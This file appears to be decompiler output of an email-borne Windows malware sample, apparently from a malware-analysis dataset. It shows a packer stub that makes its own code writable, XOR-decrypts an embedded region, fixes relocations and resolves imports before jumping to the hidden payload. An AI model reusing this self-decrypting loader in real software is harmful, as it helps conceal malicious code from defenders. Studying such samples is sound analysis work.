// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0663/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 eax, word32 ebx)
{
fn00401000_entry:
l00401000:
	Eq_2 * esi_12 = null
	Eq_2 * edi_17 = (Eq_2 *) 0x0000001F
	branch AddUsersToEncryptedFile(0x00403020, 0x00000000) != 0x00000000 l00401028
l00401027:
	return
l00401028:
	fp->dwFFFFFFEC = 0xFFFFFFFF;
	fp->dwFFFFFFEC = 0xFFFFFFFF;
	word32 eax_33 = AreAllAccessesGranted(0x00403020, 0x00000000)
	branch eax_33 != 0x00000000 l00401039
l00401036:
	edi_17 = eax_33 + 0x00000011;
l00401039:
	fp->dwFFFFFFEC = (fp - 0x00000010).u0;
	fp->dwFFFFFFEC = 0x00000040;
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	fp->dwFFFFFFEC = 0x000000E3;
	Eq_56 * ecx_54 = null
l00401056:
	branch esi_12 != edi_17 l0040105C
l0040105A:
	esi_12 = null;
l0040105C:
	ecx_54->b4015C8 = esi_12->b404000 ^ ecx_54->b4015C8 ^ 0x90;
	ecx_54 = ecx_54 + 1;
	esi_12 = esi_12 + 1;
	branch ecx_54 <u (Eq_56 *) 0x00001440 l00401056
l00401085:
	fp->dwFFFFFFEC = 0x000000E4;
	Eq_84 * edx_277 = &globals->t4028C8
	up32 edi_281 = 0x00000000
	up32 dwLoc08_276 = 0x00000000
	branch false l00401100
l004010B2:
	Eq_104 eax_285 = edx_277->dw0004 - 0x00000008 >>u 0x00000001
	Eq_112 * ecx_289 = &edx_277->t0008
	branch eax_285 <= 0x00000000 l004010ED
l004010C1:
	Eq_104 ebx_305 = eax_285
l004010C3:
	branch (ecx_289->w0000 & 0xF000) != 0x3000 l004010E1
l004010D0:
	Eq_134 * eax_328 = ((word32) ecx_289->w0000 & 0x00000FFF) + edx_277->dw0000
	eax_328->dw401348 = eax_328->dw401348 + 0xF0401348;
l004010E1:
	ecx_289 = ecx_289 + 1;
	ebx_305 = ebx_305 - 0x00000001;
	branch ebx_305 != 0x00000000 l004010C3
l004010E9:
	edi_281 = dwLoc08_276;
l004010ED:
	edi_281 = edi_281 + edx_277->dw0004;
	dwLoc08_276 = edi_281;
	edx_277 = edx_277 + Mem85[edx_277 + 0x00000004:word32];
	branch edi_281 <u 0x000000E4 l004010B2
l00401100:
	branch globals->dw4020C4 == 0x00000000 l004011A8
	Eq_95 * edi_111 = &globals->t4020B4
	Eq_95 * dwLoc08_112 = &globals->t4020B4
	edi_141 = edi_111;
	branch globals->dw4020C4 == 0x00000000 l004011A8
l00401117:
	Eq_95 * edi_141
	branch LoadLibraryA(edi_141->dw000C + 0x00401348) == 0x00000000 l00401197
	Eq_169 eax_158 = LoadLibraryA(edi_141->dw000C + 0x00401348)
	branch eax_158 == 0x00000000 l00401197
l0040112B:
	branch edi_141->dw0000 != 0x00000000 l00401134
	word32 ecx_188 = edi_141->dw0000
	branch ecx_188 != 0x00000000 l00401134
l00401131:
	ecx_188 = edi_141->dw0010;
l00401134:
	Eq_200 * ebp_195 = ecx_188 + 0x00401348
	Eq_203 * edi_198 = edi_141->dw0010 + 0x00401348
	branch ebp_195->dw0000 == 0x00000000 l0040118F
l00401146:
	eax_225 = eax_158;
	goto l00401154
l00401150:
	eax_225 = eax_158;
l00401154:
	word32 eax_242
	Eq_169 eax_225
	int32 ecx_232 = ebp_195->dw0000
	word16 cx_233 = (word16) ecx_232
	branch ecx_232 >= 0x00000000 l0040116E
l0040115E:
	eax_242 = GetProcAddress(eax_225, (word32) cx_233);
	goto l0040117E
l0040116E:
	eax_242 = GetProcAddress(eax_225, ecx_232 + 0x0040134A);
l0040117E:
	edi_198->dw0000 = eax_242;
	ebp_195 = ebp_195 + 1;
	edi_198 = edi_198 + 1;
	branch ebp_195->dw0000 != 0x00000000 l00401150
l0040118F:
	edi_141 = dwLoc08_112;
l00401197:
	edi_141 = edi_141 + 1;
	dwLoc08_112 = edi_141;
	branch edi_141->dw0010 != 0x00000000 l00401117
l004011A8:
	0x00401DA8()
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

